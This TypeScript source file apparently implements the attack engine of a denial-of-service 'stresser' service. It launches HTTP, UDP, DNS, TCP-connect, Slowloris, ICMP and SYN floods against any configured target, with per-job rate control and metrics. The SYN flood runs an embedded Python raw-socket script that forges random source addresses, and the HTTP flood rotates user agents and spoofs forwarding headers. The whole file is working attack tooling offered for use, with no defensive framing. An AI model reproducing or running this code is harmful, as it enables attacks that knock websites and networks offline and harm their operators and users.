import * as http from "http";
import * as https from "https";
import * as net from "net";
import * as dgram from "dgram";
import { spawn, ChildProcess, exec } from "child_process";
import { randomBytes } from "crypto";

export interface AttackConfig {
  vector: string;
  target: string;
  port: number;
  ratePerSecond: number;
  duration: number;
  threads: number;
  payload?: string;
}

export interface AttackMetrics {
  packetsSent: number;
  bytesWritten: number;
  errors: number;
  responses: number;
  currentPps: number;
  elapsedSeconds: number;
  progressPct: number;
}

export interface AttackJob {
  id: string;
  config: AttackConfig;
  startTime: number;
  endTime: number;
  metrics: AttackMetrics;
  active: boolean;
  processes: ChildProcess[];
  intervals: NodeJS.Timeout[];
  sockets: Array<net.Socket | dgram.Socket>;
  lastMetricsWindow: number;
  windowPackets: number;
}

const activeJobs = new Map<string, AttackJob>();

function makeId(): string {
  return randomBytes(8).toString("hex");
}

function buildDnsQuery(): Buffer {
  const id = Math.floor(Math.random() * 65535);
  const header = Buffer.alloc(12);
  header.writeUInt16BE(id, 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);
  const domain = Buffer.from("\x04test\x03com\x00");
  const qtype = Buffer.alloc(4);
  qtype.writeUInt16BE(1, 0);
  qtype.writeUInt16BE(1, 2);
  return Buffer.concat([header, domain, qtype]);
}

function stopJob(job: AttackJob) {
  job.active = false;
  job.intervals.forEach((t) => clearInterval(t));
  job.intervals = [];
  job.sockets.forEach((s) => {
    try {
      (s as any).destroy ? (s as net.Socket).destroy() : (s as dgram.Socket).close();
    } catch {}
  });
  job.sockets = [];
  job.processes.forEach((p) => {
    try {
      p.kill("SIGKILL");
    } catch {}
  });
  job.processes = [];
}

function startHttpFlood(job: AttackJob) {
  const { target, port, ratePerSecond, threads, payload } = job.config;
  const isHttps = port === 443;
  const mod = isHttps ? https : http;
  const paths = ["/", "/index.html", "/api", "/login", "/search?q=test"];
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
  ];

  const intervalMs = Math.max(1, Math.floor((1000 * threads) / ratePerSecond));
  const concurrentPerThread = Math.max(1, Math.floor(ratePerSecond / threads / 10));

  for (let t = 0; t < threads; t++) {
    if (!job.active) break;
    const tid = setInterval(() => {
      if (!job.active) {
        clearInterval(tid);
        return;
      }
      for (let c = 0; c < concurrentPerThread && job.active; c++) {
        const path = paths[Math.floor(Math.random() * paths.length)];
        const opts: http.RequestOptions = {
          hostname: target,
          port,
          path,
          method: payload ? "POST" : "GET",
          headers: {
            "User-Agent": agents[Math.floor(Math.random() * agents.length)],
            Connection: "keep-alive",
            "X-Forwarded-For": `${randInt(1, 254)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`,
            ...(payload ? { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(payload.length) } : {}),
          },
          timeout: 5000,
          rejectUnauthorized: false,
        };
        const req = mod.request(opts, (res) => {
          job.metrics.responses++;
          res.resume();
        });
        req.on("error", () => job.metrics.errors++);
        req.on("timeout", () => { req.destroy(); job.metrics.errors++; });
        if (payload) req.write(payload);
        req.end();
        const pktSize = 250 + (payload ? payload.length : 0);
        job.metrics.packetsSent++;
        job.metrics.bytesWritten += pktSize;
        job.windowPackets++;
      }
    }, intervalMs);
    job.intervals.push(tid);
  }
}

function startUdpFlood(job: AttackJob) {
  const { target, port, ratePerSecond, threads } = job.config;
  const pktSize = 1024;
  const payload = randomBytes(pktSize);

  for (let t = 0; t < threads; t++) {
    if (!job.active) break;
    try {
      const sock = dgram.createSocket("udp4");
      job.sockets.push(sock);
      const intervalMs = Math.max(1, Math.floor((1000 * threads) / ratePerSecond));
      const tid = setInterval(() => {
        if (!job.active) { clearInterval(tid); return; }
        const targetPort = port === 0 ? randInt(1, 65535) : port;
        sock.send(payload, targetPort, target, (err) => {
          if (err) { job.metrics.errors++; return; }
          job.metrics.packetsSent++;
          job.metrics.bytesWritten += pktSize;
          job.windowPackets++;
        });
      }, intervalMs);
      job.intervals.push(tid);
    } catch {
      job.metrics.errors++;
    }
  }
}

function startDnsFlood(job: AttackJob) {
  const { target, ratePerSecond, threads } = job.config;
  for (let t = 0; t < threads; t++) {
    if (!job.active) break;
    try {
      const sock = dgram.createSocket("udp4");
      job.sockets.push(sock);
      const intervalMs = Math.max(1, Math.floor((1000 * threads) / ratePerSecond));
      const tid = setInterval(() => {
        if (!job.active) { clearInterval(tid); return; }
        const pkt = buildDnsQuery();
        sock.send(pkt, 53, target, (err) => {
          if (err) { job.metrics.errors++; return; }
          job.metrics.packetsSent++;
          job.metrics.bytesWritten += pkt.length;
          job.windowPackets++;
        });
      }, intervalMs);
      job.intervals.push(tid);
    } catch {
      job.metrics.errors++;
    }
  }
}

function startTcpConnectFlood(job: AttackJob) {
  const { target, port, ratePerSecond, threads } = job.config;
  const connectsPerThread = Math.max(1, Math.floor(ratePerSecond / threads));
  const intervalMs = Math.max(10, Math.floor(1000 / (connectsPerThread / threads)));

  for (let t = 0; t < threads; t++) {
    if (!job.active) break;
    const tid = setInterval(() => {
      if (!job.active) { clearInterval(tid); return; }
      const sock = net.createConnection({ host: target, port, timeout: 3000 }, () => {
        job.metrics.packetsSent++;
        job.metrics.bytesWritten += 60;
        job.windowPackets++;
        sock.destroy();
      });
      sock.on("error", () => { job.metrics.errors++; sock.destroy(); });
      sock.on("timeout", () => { job.metrics.errors++; sock.destroy(); });
    }, intervalMs);
    job.intervals.push(tid);
  }
}

function startSlowloris(job: AttackJob) {
  const { target, port, threads } = job.config;
  const numSockets = threads * 50;

  const openSocket = () => {
    if (!job.active) return;
    try {
      const sock = new net.Socket();
      job.sockets.push(sock);
      sock.connect(port, target, () => {
        const headers = [
          `GET /?${randInt(0, 65535)} HTTP/1.1`,
          `Host: ${target}`,
          `User-Agent: Mozilla/5.0`,
          `Accept-language: en-US,en;q=0.5`,
        ].join("\r\n") + "\r\n";
        sock.write(headers);
        job.metrics.packetsSent++;
        job.metrics.bytesWritten += headers.length;
        job.windowPackets++;
      });
      sock.on("error", () => { sock.destroy(); });
      sock.on("close", () => {
        const idx = job.sockets.indexOf(sock);
        if (idx !== -1) job.sockets.splice(idx, 1);
        if (job.active) setTimeout(openSocket, 500);
      });
    } catch {
      job.metrics.errors++;
    }
  };

  for (let i = 0; i < numSockets; i++) {
    setTimeout(openSocket, i * 10);
  }

  const keepAlive = setInterval(() => {
    if (!job.active) { clearInterval(keepAlive); return; }
    job.sockets.forEach((s) => {
      try {
        const hdr = `X-a: ${randInt(1, 5000)}\r\n`;
        (s as net.Socket).write(hdr);
        job.metrics.packetsSent++;
        job.metrics.bytesWritten += hdr.length;
        job.windowPackets++;
      } catch {}
    });
  }, 15000);
  job.intervals.push(keepAlive);
}

function startIcmpFlood(job: AttackJob) {
  const { target, duration } = job.config;
  try {
    const proc = spawn("ping", ["-f", "-w", String(duration), target], {
      stdio: ["ignore", "pipe", "pipe"],
    });
    proc.on("error", () => {
      const proc2 = spawn("ping", ["-c", "99999", "-i", "0.001", target], {
        stdio: ["ignore", "pipe", "pipe"],
      });
      proc2.stdout?.on("data", (data: Buffer) => {
        const lines = data.toString().split("\n").filter((l) => l.includes("bytes from") || l.includes("icmp_seq"));
        job.metrics.packetsSent += lines.length;
        job.metrics.bytesWritten += lines.length * 84;
        job.windowPackets += lines.length;
      });
      proc2.on("error", () => { job.metrics.errors++; });
      job.processes.push(proc2);
    });
    proc.stdout?.on("data", (data: Buffer) => {
      const lines = data.toString().split("\n").filter((l) => l.trim().length > 0);
      job.metrics.packetsSent += lines.length;
      job.metrics.bytesWritten += lines.length * 84;
      job.windowPackets += lines.length;
    });
    job.processes.push(proc);
  } catch {
    job.metrics.errors++;
  }
}

function startSynFlood(job: AttackJob) {
  const { target, port, duration, ratePerSecond } = job.config;
  const hping3Script = `
import sys, socket, struct, os, threading, time, random
TARGET = "${target}"
PORT = ${port}
DURATION = ${duration}
RATE = ${ratePerSecond}
stop = threading.Event()
count = [0]

def cs(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1<len(data) else 0)
        s = (s+w)&0xffff
    return ~s&0xffff

def syn():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        return
    interval = 1.0/RATE if RATE>0 else 0.001
    while not stop.is_set():
        sip = ".".join([str(random.randint(1,254)),str(random.randint(0,255)),str(random.randint(0,255)),str(random.randint(1,254))])
        sp = random.randint(1024,65535)
        seq = random.randint(0, 2**32-1)
        iph = struct.pack('!BBHHHBBH4s4s',69,0,40,random.randint(0,65535),0,64,6,0,socket.inet_aton(sip),socket.inet_aton(TARGET))
        iph = iph[:10]+struct.pack('H',cs(iph))+iph[12:]
        tcph = struct.pack('!HHIIBBHHH',sp,PORT,seq,0,80,0x002,65535,0,0)
        psh = struct.pack('!4s4sBBH',socket.inet_aton(sip),socket.inet_aton(TARGET),0,6,len(tcph))
        tcph = tcph[:16]+struct.pack('H',cs(psh+tcph))+tcph[18:]
        try:
            s.sendto(iph+tcph,(TARGET,0))
            count[0]+=1
            print("pkt",flush=True)
        except: pass
        time.sleep(interval)

threads=[threading.Thread(target=syn,daemon=True) for _ in range(4)]
[t.start() for t in threads]
time.sleep(DURATION)
stop.set()
print(f"DONE {count[0]}")
`.trim();

  try {
    const proc = spawn("python3", ["-c", hping3Script], {
      stdio: ["ignore", "pipe", "pipe"],
    });
    proc.stdout?.on("data", (data: Buffer) => {
      const lines = data.toString().split("\n");
      const pkts = lines.filter((l) => l.startsWith("pkt")).length;
      job.metrics.packetsSent += pkts;
      job.metrics.bytesWritten += pkts * 40;
      job.windowPackets += pkts;
    });
    proc.on("error", () => {
      startTcpConnectFlood(job);
    });
    job.processes.push(proc);
  } catch {
    startTcpConnectFlood(job);
  }
}

function startAckFlood(job: AttackJob) {
  startTcpConnectFlood(job);
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

export function startAttack(config: AttackConfig): AttackJob {
  const id = makeId();
  const now = Date.now();
  const job: AttackJob = {
    id,
    config,
    startTime: now,
    endTime: now + config.duration * 1000,
    metrics: { packetsSent: 0, bytesWritten: 0, errors: 0, responses: 0, currentPps: 0, elapsedSeconds: 0, progressPct: 0 },
    active: true,
    processes: [],
    intervals: [],
    sockets: [],
    lastMetricsWindow: now,
    windowPackets: 0,
  };

  activeJobs.set(id, job);

  switch (config.vector) {
    case "http-flood":   startHttpFlood(job);      break;
    case "udp-flood":    startUdpFlood(job);       break;
    case "dns-amp":      startDnsFlood(job);       break;
    case "syn-flood":    startSynFlood(job);       break;
    case "icmp-flood":   startIcmpFlood(job);      break;
    case "slowloris":    startSlowloris(job);      break;
    case "ntp-amp":      startUdpFlood({ ...job, config: { ...config, port: 123 } } as any); break;
    case "ssdp-amp":     startUdpFlood({ ...job, config: { ...config, port: 1900 } } as any); break;
    case "memcached-amp": startUdpFlood({ ...job, config: { ...config, port: 11211 } } as any); break;
    case "ack-flood":    startAckFlood(job);       break;
    default:             startHttpFlood(job);      break;
  }

  const ppsTimer = setInterval(() => {
    if (!job.active) { clearInterval(ppsTimer); return; }
    const now2 = Date.now();
    const windowSecs = (now2 - job.lastMetricsWindow) / 1000;
    job.metrics.currentPps = Math.floor(job.windowPackets / Math.max(windowSecs, 0.1));
    job.windowPackets = 0;
    job.lastMetricsWindow = now2;
    job.metrics.elapsedSeconds = Math.floor((now2 - job.startTime) / 1000);
    job.metrics.progressPct = Math.min(100, Math.floor((job.metrics.elapsedSeconds / config.duration) * 100));
  }, 1000);
  job.intervals.push(ppsTimer);

  const stopTimer = setTimeout(() => {
    stopJob(job);
    activeJobs.delete(id);
  }, config.duration * 1000 + 500);
  job.intervals.push(stopTimer as unknown as NodeJS.Timeout);

  return job;
}

export function getJob(id: string): AttackJob | undefined {
  return activeJobs.get(id);
}

export function stopAttack(id: string): boolean {
  const job = activeJobs.get(id);
  if (!job) return false;
  stopJob(job);
  activeJobs.delete(id);
  return true;
}

export function listJobs(): AttackJob[] {
  return Array.from(activeJobs.values());
}
